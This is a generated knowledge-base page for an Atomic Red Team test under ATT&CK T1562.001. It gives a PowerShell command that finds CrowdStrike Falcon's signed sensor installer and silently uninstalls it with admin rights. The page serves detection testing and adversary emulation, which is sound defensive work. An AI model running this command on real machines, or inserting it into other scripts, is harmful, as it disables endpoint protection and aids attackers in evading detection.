---
atomic_guid: "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297"
title: "Uninstall Crowdstrike Falcon on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297"
  - "Uninstall Crowdstrike Falcon on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Uninstall Crowdstrike Falcon on Windows

Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.

## Metadata

- Atomic GUID: b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Input Arguments

### falcond_path

- description: The Crowdstrike Windows Sensor path. The Guid always changes.
- type: path
- default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
